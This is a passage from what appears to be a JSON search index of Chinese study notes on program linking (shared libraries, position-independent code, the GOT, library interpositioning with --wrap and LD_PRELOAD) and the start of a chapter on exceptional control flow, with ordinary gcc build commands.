\u200b\u7684\u200b\u7a7a\u95f4\u200b\u662f\u200b\u52a0\u8f7d\u200b\u5230\u200b\u5185\u5b58\u200b\u65f6\u624d\u200b\u5206\u914d\u200b\u7684\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#79","title":"7.9 \u200b\u52a0\u8f7d\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6","text":"<p>\u200b\u4ee3\u7801\u6bb5\u200b\u603b\u662f\u200b\u4ece\u200b 0x400000 \u200b\u5904\u200b\u5f00\u59cb\u200b, \u200b\u540e\u9762\u200b\u662f\u200b\u6570\u636e\u200b\u6bb5\u200b. \u200b\u8fd0\u884c\u200b\u65f6\u5806\u200b\u5728\u200b\u6570\u636e\u200b\u6bb5\u200b\u4e4b\u540e\u200b, \u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b malloc \u200b\u5411\u4e0a\u200b\u589e\u957f\u200b. \u200b\u5806\u200b\u540e\u9762\u200b\u7684\u200b\u533a\u57df\u200b\u662f\u200b\u4e3a\u200b\u5171\u4eab\u200b\u6a21\u5757\u200b\u4fdd\u7559\u200b\u7684\u200b. \u200b\u7528\u6237\u200b\u6808\u200b\u603b\u662f\u200b\u4ece\u200b\u6700\u5927\u200b\u7684\u200b\u5408\u6cd5\u200b\u7528\u6237\u200b\u5730\u5740\u200b 2^48-1 \u200b\u5f00\u59cb\u200b, \u200b\u5411\u200b\u4f4e\u200b\u5730\u5740\u200b\u589e\u957f\u200b, \u200b\u6808\u200b\u4ee5\u4e0a\u200b\u7684\u200b\u533a\u57df\u200b\u662f\u200b\u4e3a\u200b\u5185\u6838\u200b\u4fdd\u7559\u200b\u7684\u200b.</p> <p>\u200b\u7531\u4e8e\u200b\u5bf9\u9f50\u200b\u8981\u6c42\u200b, \u200b\u4ee3\u7801\u6bb5\u200b\u548c\u200b\u6570\u636e\u200b\u6bb5\u200b\u4e4b\u95f4\u200b\u4f1a\u200b\u6709\u200b\u4e00\u70b9\u200b\u7a7a\u9699\u200b. \u200b\u5206\u914d\u200b\u6808\u200b\u7b49\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u8fd8\u4f1a\u200b\u4f7f\u7528\u200b\u5730\u5740\u200b\u7a7a\u95f4\u5e03\u5c40\u200b\u968f\u673a\u5316\u200b. </p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#710","title":"7.10 \u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5171\u4eab\u200b\u5e93","text":"<p>\u200b\u9759\u6001\u200b\u5e93\u200b\u7684\u200b\u7f3a\u70b9\u200b: \u200b\u9700\u8981\u200b\u5b9a\u671f\u7ef4\u62a4\u200b\u548c\u200b\u66f4\u65b0\u200b. \u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u6a21\u5757\u200b\u4f1a\u200b\u590d\u5236\u5230\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6587\u672c\u200b\u6bb5\u200b\u4e2d\u200b.</p> <p>\u200b\u5171\u4eab\u200b\u5e93\u200b\u5728\u200b\u8fd0\u884c\u200b\u6216\u200b\u52a0\u8f7d\u200b\u65f6\u200b, \u200b\u53ef\u4ee5\u200b\u52a0\u8f7d\u200b\u5230\u200b\u4efb\u610f\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b, \u200b\u5e76\u200b\u548c\u200b\u4e00\u4e2a\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u94fe\u63a5\u200b\u8d77\u6765\u200b, \u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u79f0\u4e3a\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b.</p> <p>\u200b\u5171\u4eab\u200b\u5e93\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u5171\u4eab\u200b\u76ee\u6807\u200b (shared object), Linux \u200b\u4e2d\u200b\u4f7f\u7528\u200b .so \u200b\u540e\u7f00\u200b, Windows \u200b\u4e2d\u200b\u4f7f\u7528\u200b DLL(\u200b\u52a8\u6001\u94fe\u63a5\u5e93\u200b)</p> <p>so \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b, \u200b\u4e0d\u662f\u200b\u50cf\u200b\u9759\u6001\u200b\u5e93\u200b\u4e00\u6837\u200b\u590d\u5236\u200b\u548c\u200b\u5d4c\u5165\u200b\u5230\u200b\u5f15\u7528\u200b\u5b83\u4eec\u200b\u7684\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b, \u200b\u4e00\u4e2a\u200b\u526f\u672c\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u4e0d\u540c\u200b\u7684\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b.</p> <p>Note</p> <p>\u200b\u5efa\u8bae\u200b\u5148\u200b\u5b66\u4e60\u200b Chapter 09 Virtual Memory \u200b\u4e4b\u540e\u200b\u518d\u200b\u56de\u200b\u770b\u4e00\u904d\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5171\u4eab\u200b\u5e93\u200b. \u200b\u5c24\u5176\u200b\u662f\u200b mmap \u200b\u548c\u200b COW \u200b\u7684\u200b\u6982\u5ff5\u200b.</p> <p></p> <p>\u200b\u7f16\u8bd1\u200b\u65f6\u200b, \u200b\u6267\u884c\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b</p> Bash<pre><code>&gt; gcc -shared -fpic -o libvector.so addvec.c multvec.c\n&gt; gcc -o prog21 main2.c ./libvector.so\n</code></pre> <p>-fpic \u200b\u662f\u200b\u6307\u5b9a\u200b\u751f\u6210\u200b\u4f4d\u7f6e\u200b\u65e0\u5173\u200b\u4ee3\u7801\u200b</p> <p>\u200b\u6ce8\u610f\u200b, \u200b\u751f\u6210\u200b prog21 \u200b\u7684\u200b\u65f6\u5019\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b\u8282\u200b\u771f\u7684\u200b\u88ab\u200b\u590d\u5236\u5230\u200b\u4e86\u200b prog21 \u200b\u4e2d\u200b. \u200b\u53cd\u4e4b\u200b, \u200b\u94fe\u63a5\u200b\u5668\u200b\u590d\u5236\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u548c\u200b\u7b26\u53f7\u8868\u200b\u4fe1\u606f\u200b, \u200b\u4f7f\u5f97\u200b\u8fd0\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u89e3\u6790\u200b\u5806\u200b libvector.so \u200b\u4e2d\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b\u7684\u200b\u5f15\u7528\u200b.</p> <p>\u200b\u52a0\u8f7d\u200b\u65f6\u200b, \u200b\u52a0\u8f7d\u200b\u5668\u200b\u6ce8\u610f\u200b\u5230\u200b prog21 \u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b .interp \u200b\u8282\u200b, \u200b\u8fd9\u200b\u4e00\u8282\u200b\u5305\u542b\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u200b\u7684\u200b\u8def\u5f84\u540d\u200b. \u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u200b\u672c\u8eab\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5171\u4eab\u200b\u76ee\u6807\u200b, \u200b\u52a0\u8f7d\u200b\u5668\u200b\u52a0\u8f7d\u200b\u548c\u200b\u8fd0\u884c\u200b\u5b83\u200b, \u200b\u7136\u540e\u200b\u6267\u884c\u200b\u4e0b\u9762\u200b\u7684\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u5b8c\u6210\u200b\u94fe\u63a5\u200b: - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b libc.so \u200b\u7684\u200b\u6587\u672c\u200b\u548c\u200b\u6570\u636e\u200b\u5230\u200b\u67d0\u4e2a\u200b\u5185\u5b58\u200b\u6bb5\u200b (\u200b\u6bcf\u200b\u4e00\u4e2a\u200bC\u200b\u7a0b\u5e8f\u200b\u90fd\u200b\u4f1a\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u8fd9\u4e2a\u200b\u5e93\u200b) - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b libvector.so \u200b\u7684\u200b\u6587\u672c\u200b\u548c\u200b\u6570\u636e\u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u6bb5\u200b - \u200b\u91cd\u200b\u5b9a\u4f4d\u200b prog21 \u200b\u4e2d\u200b\u6240\u6709\u200b\u5bf9\u200b libc.so \u200b\u548c\u200b libvector.so \u200b\u5b9a\u4e49\u200b\u7684\u200b\u7b26\u53f7\u200b\u7684\u200b\u5f15\u7528\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#711","title":"7.11 \u200b\u4ece\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u4e2d\u200b\u52a0\u8f7d\u200b\u548c\u200b\u94fe\u63a5\u200b\u5171\u4eab\u200b\u5e93","text":"<p>\u200b\u524d\u9762\u200b\u8ba8\u8bba\u200b\u7684\u200b\u662f\u200b\u52a0\u8f7d\u200b\u540e\u200b\u6267\u884c\u200b\u524d\u65f6\u200b\u6267\u884c\u200b\u7684\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b, \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u8fd8\u200b\u53ef\u80fd\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u8981\u6c42\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u200b\u52a0\u8f7d\u200b\u548c\u200b\u94fe\u63a5\u200b\u67d0\u4e2a\u200b\u5171\u4eab\u200b\u5e93\u200b. </p> <p>Linux \u200b\u7cfb\u7edf\u200b\u4e3a\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u63a5\u53e3\u200b, \u200b\u4f7f\u5f97\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u52a0\u8f7d\u200b\u548c\u200b\u94fe\u63a5\u200b\u5171\u4eab\u200b\u5e93\u200b, \u200b\u5982\u679c\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u4f7f\u7528\u200b\u4e86\u200b -rdynamic \u200b\u9009\u9879\u200b\u7f16\u8bd1\u200b, \u200b\u90a3\u4e48\u200b\u4e3b\u7a0b\u5e8f\u200b\u7684\u200b\u5168\u5c40\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u5171\u4eab\u200b\u5e93\u200b\u4e5f\u200b\u662f\u200b\u53ef\u89c1\u200b\u7684\u200b.</p> C<pre><code>#include &lt;dlfcn.h&gt;\n\nvoid *dlopen(const char *filename, int flag);\n// \u200b\u8fd4\u56de\u200b: \u200b\u82e5\u200b\u6210\u529f\u200b\u5219\u200b\u4e3a\u200b\u6307\u5411\u200b\u53e5\u67c4\u200b\u7684\u200b\u6307\u9488\u200b(\u200b\u53e5\u67c4\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u6210\u200b\u6307\u5411\u200b\u8fd9\u4e2a\u200b\u5171\u4eab\u200b\u5e93\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6807\u5fd7\u200b), \u200b\u51fa\u9519\u200b\u5219\u200b\u4e3a\u200b NULL\nvoid *dlsym(void *handle, char *symbol);\n// \u200b\u8fd4\u56de\u200b: \u200b\u82e5\u200b\u6210\u529f\u200b\u8fd4\u56de\u200b\u6307\u5411\u200b\u7b26\u53f7\u200b\u7684\u200b\u6307\u9488\u200b, \u200b\u82e5\u200b\u51fa\u9519\u200b\u5219\u200b\u4e3a\u200b NULL\nvoid dlclose(void *handle);\n// \u200b\u8fd4\u56de\u200b: \u200b\u82e5\u200b\u6210\u529f\u200b\u8fd4\u56de\u200b 0, \u200b\u5426\u5219\u200b -1\nconst char *dlerror(void);\n// \u200b\u8fd4\u56de\u200b: \u200b\u5982\u679c\u200b\u524d\u9762\u200b\u6709\u200b\u5bf9\u200b\u4e0a\u9762\u200b\u4e09\u4e2a\u200b\u51fd\u6570\u200b\u7684\u200b\u8c03\u7528\u200b\u5931\u8d25\u200b, \u200b\u5219\u200b\u4e3a\u200b\u9519\u8bef\u4fe1\u606f\u200b(\u200b\u6700\u8fd1\u200b\u7684\u200b\u9519\u8bef\u200b), \u200b\u5426\u5219\u200b\u8fd4\u56de\u200b NULL\n</code></pre> <ul> <li>filename: \u200b\u5171\u4eab\u200b\u5e93\u200b\u7684\u200b\u540d\u5b57\u200b</li> <li>flag:  NOW \u200b\u548c\u200b LAZY \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u548c\u200b GLOBAL \u200b\u7b26\u53f7\u200b\u53d6\u200b\u6216\u200b</li> </ul> <p>Note</p> <p>\u201c\u200b\u6240\u6709\u200b\u5916\u90e8\u200b\u7b26\u53f7\u200b\u5f15\u7528\u200b\u201d\u200b\u5c31\u662f\u6307\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u52a0\u8f7d\u200b\u7684\u200b\u5171\u4eab\u200b\u5e93\u4e2d\u200b\uff0c\u200b\u6240\u6709\u200b\u5bf9\u5916\u90e8\u200b\u6a21\u5757\u200b\uff08\u200b\u4e3b\u7a0b\u5e8f\u200b\u6216\u200b\u5176\u4ed6\u200b\u5e93\u200b\uff09\u200b\u6240\u200b\u63d0\u4f9b\u200b\u7684\u200b\u51fd\u6570\u200b\u548c\u200b\u53d8\u91cf\u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p> <p>GLOBAL \u200b\u5c31\u662f\u200b\u8ba9\u200b\u5176\u5b83\u200b\u7684\u200b\u5171\u4eab\u200b\u5e93\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u7684\u200b\u7b26\u53f7\u200b. </p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#712","title":"7.12 \u200b\u4f4d\u7f6e\u200b\u65e0\u5173\u200b\u4ee3\u7801","text":"<p>\u200b\u8fd9\u4e2a\u200b\u7528\u4e8e\u200b\u89e3\u51b3\u200b\u5171\u4eab\u200b\u5e93\u200b\u52a0\u8f7d\u200b\u5230\u200b\u7684\u200b\u5730\u5740\u200b\u95ee\u9898\u200b.</p> <p>\u200b\u5982\u679c\u200b\u5171\u4eab\u200b\u5e93\u200b\u6bcf\u6b21\u200b\u52a0\u8f7d\u200b\u5230\u200b\u4e13\u95e8\u200b\u7684\u200b\u5730\u5740\u200b, \u200b\u5f88\u200b\u5bb9\u6613\u200b\u9020\u6210\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u6d6a\u8d39\u200b. \u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5f88\u200b\u5bb9\u6613\u200b\u88ab\u200b\u5206\u88c2\u200b\u6210\u200b\u5927\u91cf\u200b\u5c0f\u200b\u7684\u200b, \u200b\u672a\u200b\u4f7f\u7528\u200b\u7684\u200b\u800c\u200b\u4e0d\u80fd\u200b\u518d\u200b\u4f7f\u7528\u200b\u7684\u200b\u5c0f\u6d1e\u200b.</p> <p>\u200b\u73b0\u4ee3\u200b\u7f16\u8bd1\u5668\u200b\u4f7f\u5f97\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5171\u4eab\u200b\u5e93\u200b\u52a0\u8f7d\u200b\u5230\u200b\u5185\u5b58\u200b\u7684\u200b\u4efb\u4f55\u200b\u4f4d\u7f6e\u200b\u800c\u200b\u65e0\u9700\u200b\u94fe\u63a5\u200b\u5668\u200b\u4fee\u6539\u200b, \u200b\u53ef\u4ee5\u200b\u52a0\u8f7d\u200b\u800c\u200b\u65e0\u9700\u200b\u91cd\u200b\u5b9a\u4f4d\u200b\u7684\u200b\u4ee3\u7801\u200b\u79f0\u4e3a\u200b\u4f4d\u7f6e\u200b\u65e0\u5173\u200b\u4ee3\u7801\u200b, GCC \u200b\u4f7f\u7528\u200b -fpic \u200b\u9009\u9879\u200b\u6307\u793a\u200b\u7f16\u8bd1\u7cfb\u7edf\u200b\u751f\u6210\u200b PIC (Position-Independent Code) \u200b\u4ee3\u7801\u200b. \u200b\u5171\u4eab\u200b\u5e93\u200b\u7684\u200b\u7f16\u8bd1\u200b\u5fc5\u987b\u200b\u603b\u662f\u200b\u4f7f\u7528\u200b\u8be5\u200b\u9009\u9879\u200b.</p> <p>\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b\u7b26\u53f7\u200b\u7684\u200b\u5f15\u7528\u200b\u4e0d\u200b\u9700\u8981\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b\u4f7f\u200b\u4e4b\u200b\u6210\u4e3a\u200b PIC, \u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u7528\u200b PC \u200b\u76f8\u5bf9\u200b\u5bfb\u5740\u200b\u6765\u200b\u7f16\u8bd1\u200b\u8fd9\u4e9b\u200b\u5f15\u7528\u200b, \u200b\u6784\u9020\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u65f6\u200b\u4f7f\u7528\u200b\u9759\u6001\u200b\u94fe\u63a5\u200b\u5668\u91cd\u200b\u5b9a\u4f4d\u200b. (\u200b\u53ea\u8981\u200b\u5728\u200b\u9759\u6001\u200b\u94fe\u63a5\u200b\u65f6\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u504f\u79fb\u91cf\u200b\u5d4c\u5165\u200b\u5230\u200b\u6307\u4ee4\u200b\u4e2d\u200b\u5c31\u200b\u597d\u200b\u4e86\u200b)</p> <p>\u200b\u4f4d\u7f6e\u200b\u65e0\u5173\u200b\u7684\u200b\u6838\u5fc3\u200b\u5c31\u662f\u200b\u5229\u7528\u200b\u4e86\u200b\u5982\u4e0b\u200b\u4e8b\u5b9e\u200b: \u200b\u65e0\u8bba\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u54ea\u4e2a\u200b\u4f4d\u7f6e\u200b\u52a0\u8f7d\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b, \u200b\u6570\u636e\u200b\u6bb5\u200b\u4e0e\u200b\u4ee3\u7801\u6bb5\u200b\u7684\u200b\u8ddd\u79bb\u200b\u603b\u662f\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b. \u200b\u8fd0\u884c\u200b\u65f6\u200b\u6211\u4eec\u200b\u53ea\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b PC \u200b\u76f8\u5bf9\u200b\u5bfb\u5740\u200b\u5c31\u200b\u80fd\u200b\u786e\u5b9a\u200b\u53d8\u91cf\u200b\u4f4d\u7f6e\u200b. \u200b\u8fd9\u662f\u200b\u901a\u8fc7\u200b\u5168\u5c40\u200b\u504f\u79fb\u91cf\u200b\u8868\u200b (GOT) \u200b\u5b9e\u73b0\u200b\u7684\u200b. \u200b\u5728\u200b\u52a0\u8f7d\u200b\u65f6\u200b, \u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u4f1a\u91cd\u200b\u5b9a\u4f4d\u200b GOT \u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u6761\u76ee\u200b, \u200b\u4f7f\u5f97\u200b\u5b83\u200b\u5305\u542b\u200b\u4e86\u200b\u76ee\u6807\u200b\u7684\u200b\u6b63\u786e\u200b\u7684\u200b\u7edd\u5bf9\u200b\u5730\u5740\u200b, \u200b\u6bcf\u4e2a\u200b\u5f15\u7528\u200b\u5168\u5c40\u200b\u76ee\u6807\u200b\u7684\u200b\u76ee\u6807\u200b\u6a21\u5757\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b GOT.</p> <p> </p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#713","title":"7.13 \u200b\u5e93\u200b\u6253\u6869\u200b\u673a\u5236","text":"<p>\u200b\u622a\u83b7\u200b\u5bf9\u200b\u5171\u4eab\u200b\u5e93\u51fd\u6570\u200b\u7684\u200b\u8c03\u7528\u200b, \u200b\u53d6\u800c\u4ee3\u4e4b\u200b\u6267\u884c\u200b\u81ea\u5df1\u200b\u7684\u200b\u4ee3\u7801\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#7131","title":"7.13.1 \u200b\u7f16\u8bd1\u200b\u65f6\u200b\u6253\u6869","text":"<p>-Dname(=value): \u200b\u76f8\u5f53\u4e8e\u200b\u5728\u200b\u6e90\u4ee3\u7801\u200b\u5f00\u5934\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u884c\u200b #define name (value)</p> <p>\u200b\u4f7f\u7528\u200b Bash<pre><code>&gt; gcc -DCOMPILETIME -c mymalloc.c\n&gt; gcc -I. -o intc int.c mymalloc.o\n</code></pre></p> <p>-I. \u200b\u53c2\u6570\u200b\u4f1a\u200b\u544a\u8bc9\u200b C \u200b\u9884\u200b\u5904\u7406\u5668\u200b\u5728\u200b\u641c\u7d22\u200b\u901a\u5e38\u200b\u7684\u200b\u7cfb\u7edf\u76ee\u5f55\u200b\u524d\u5148\u200b\u5728\u200b\u5f53\u524d\u76ee\u5f55\u200b\u67e5\u627e\u200b malloc.h</p> <p></p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#7132","title":"7.13.2 \u200b\u94fe\u63a5\u200b\u65f6\u200b\u6253\u6869","text":"<p>\u200b\u4f7f\u7528\u200b <code>--wrap f</code> \u200b\u6807\u5fd7\u200b\u8fdb\u884c\u200b\u94fe\u63a5\u200b\u65f6\u200b\u6253\u6869\u200b, \u200b\u4ed6\u200b\u544a\u8bc9\u200b\u94fe\u63a5\u200b\u5668\u200b\u628a\u200b\u5bf9\u200b\u7b26\u53f7\u200b <code>f</code> \u200b\u7684\u200b\u5f15\u7528\u200b\u89e3\u6790\u200b\u6210\u200b <code>__wrap_f</code> \u200b\u8fd8\u8981\u200b\u628a\u200b\u5bf9\u200b\u7b26\u53f7\u200b <code>__real_f</code> \u200b\u7684\u200b\u5f15\u7528\u200b\u89e3\u6790\u200b\u6210\u200b <code>f</code>.</p> <p>\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b Bash<pre><code>&gt; gcc -DLINKTIME -c mymalloc.c\n&gt; gcc -c int.c\n&gt; gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o\n</code></pre></p> <p>-Wl,option \u200b\u628a\u200b option \u200b\u4f20\u9012\u200b\u7ed9\u200b\u94fe\u63a5\u200b\u5668\u200b, option \u200b\u7684\u200b\u6bcf\u4e2a\u200b\u9017\u53f7\u200b\u66ff\u6362\u200b\u4e3a\u200b\u7a7a\u683c\u200b, \u200b\u56e0\u6b64\u200b -Wl,--wrap,malloc \u200b\u5c31\u200b\u628a\u200b --wrap malloc \u200b\u4f20\u9012\u200b\u7ed9\u200b\u94fe\u63a5\u200b\u5668\u200b.</p>"},{"location":"notes/ICS/Chapter%2007%20Linking/#7133","title":"7.13.3 \u200b\u8fd0\u884c\u200b\u65f6\u200b\u6253\u6869","text":"<p>\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u6253\u6869\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b, \u200b\u94fe\u63a5\u200b\u65f6\u200b\u6253\u6869\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u53ef\u91cd\u200b\u5b9a\u4f4d\u200b\u5bf9\u8c61\u200b\u6587\u4ef6\u200b, \u200b\u4e0d\u8fc7\u200b\u8fd0\u884c\u200b\u65f6\u200b\u6253\u6869\u200b\u53ea\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b.</p> <p>\u200b\u65b9\u5f0f\u200b\u662f\u200b\u4f7f\u7528\u200b LD_PRELOAD \u200b\u73af\u5883\u53d8\u91cf\u200b, \u200b\u5b83\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5171\u4eab\u200b\u5e93\u200b\u8def\u5f84\u540d\u200b\u7684\u200b\u5217\u8868\u200b(\u200b\u4ee5\u200b\u7a7a\u683c\u200b\u6216\u5206\u200b\u53f7\u200b\u5206\u9694\u200b), \u200b\u5f53\u200b\u52a0\u8f7d\u200b\u548c\u200b\u6267\u884c\u200b\u4e00\u4e2a\u200b\u7a0b\u5e8f\u200b\u9700\u8981\u200b\u89e3\u6790\u200b\u672a\u5b9a\u4e49\u200b\u7684\u200b\u5f15\u7528\u200b\u65f6\u200b, \u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u5668\u4f1a\u200b\u5148\u200b\u641c\u7d22\u200b\u8fd9\u200b\u91cc\u9762\u200b\u7684\u200b\u5e93\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5171\u4eab\u200b\u5e93\u51fd\u6570\u200b\u8fdb\u884c\u200b\u6253\u6869\u200b\u4e86\u200b.</p>"},{"location":"notes/ICS/Chapter%2008%20ECF/","title":"Chapter 08 ECF","text":""},{"location":"notes/ICS/Chapter%2008%20ECF/#1-cpu","title":"1. CPU\u3001\u200b\u8fdb\u7a0b\u200b\u4e0e\u200b\u5e76\u53d1\u200b/\u200b\u5e76\u884c","text":"\u6982\u5ff5\u200b \u200b\u5173\u952e\u8bcd\u200b \u200b\u8981\u70b9\u200b \u200b\u5355\u6838\u200b CPU \u200b\u5e76\u53d1\u200b (Concurrency) \u200b\u4f2a\u200b\u5e76\u884c\u200b\u3002\u200b\u901a\u8fc7\u200b\u65f6\u95f4\u200b\u7247\u200b\u8f6e\u8f6c\u200b\u5b9e\u73b0\u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u4ea4\u66ff\u200b\u6267\u884c\u200b\u3002 \u200b\u591a\u6838\u200b CPU \u200b\u5e76\u884c\u200b (Parallelism) \u200b\u771f\u6b63\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u3002\u200b\u591a\u4e2a\u200b\u6838\u5fc3\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b/\u200b\u7ebf\u7a0b\u200b\u3002 DMA \u200b\u4f20\u8f93\u200b \u200b\u76f4\u63a5\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u89e3\u653e\u200b CPU \u200b\u5916\u8bbe\u200b\uff08\u200b\u5982\u200b\u786c\u76d8\u200b\uff09\u200b\u76f4\u63a5\u200b\u4e0e\u200b\u5185\u5b58\u200b\uff08RAM\uff09\u200b\u4ea4\u6362\u200b\u6570\u636e\u200b\uff0c\u200b\u7ed5\u8fc7\u200b CPU\uff0c\u200b\u63d0\u9ad8\u200b I/O \u200b\u6548\u7387\u200b\u3002"},{"location":"notes/ICS/Chapter%2008%20ECF/#2-c-io","title":"2. C \u200b\u8bed\u8a00\u200b\u6807\u51c6\u200b I/O \u200b\u6d41","text":"\u6d41\u200b\u540d\u79f0\u200b \u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b \u200b\u4e3b\u8981\u7528\u9014\u200b \u200b\u7f13\u51b2\u200b\u673a\u5236\u200b (\u200b\u9ed8\u8ba4\u200b) <code>stdout</code> 1 \u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6b63\u5e38\u200b\u7ed3\u679c\u200b\u548c\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u3002 \u200b\u884c\u200b\u7f13\u51b2\u200b (\u200b\u9047\u5230\u200b <code>\\n</code> \u200b\u901a\u5e38\u200b\u4f1a\u200b\u5237\u65b0\u200b)\u3002 <code>stderr</code> 2 \u200b\u7a0b\u5e8f\u200b\u7684\u200b\u9519\u8bef\u200b\u3001\u200b\u8b66\u544a\u200b\u548c\u200b\u8bca\u65ad\u200b\u4fe1\u606f\u200b\u3002 \u200b\u65e0\u200b\u7f13\u51b2\u200b\u6216\u5757\u200b\u7f13\u51b2\u200b (\u200b\u4fdd\u8bc1\u200b\u7acb\u5373\u200b\u663e\u793a\u200b\uff0c\u200b\u9632\u6b62\u200b\u4e22\u5931\u200b)\u3002 <code>printf(\"...\\n\")</code> \u200b\u5237\u65b0\u200b\u673a\u5236\u200b \u200b\u5728\u200b\u7ec8\u7aef\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u6362\u884c\u7b26\u200b <code>\\n</code> \u200b\u4f1a\u200b\u89e6\u53d1\u200b <code>stdout</code> \u200b\u7f13\u51b2\u533a\u200b\u5237\u65b0\u200b\u3002"},{"location":"notes/ICS/Chapter%2008%20ECF/#3","title":"3. \u200b\u4fe1\u53f7\u5904\u7406\u200b\u4e0e\u200b\u53ef\u200b\u91cd\u5165\u6027","text":"\u6982\u5ff5\u200b \u200b\u5173\u952e\u8bcd\u200b \u200b\u8981\u70b9\u200b 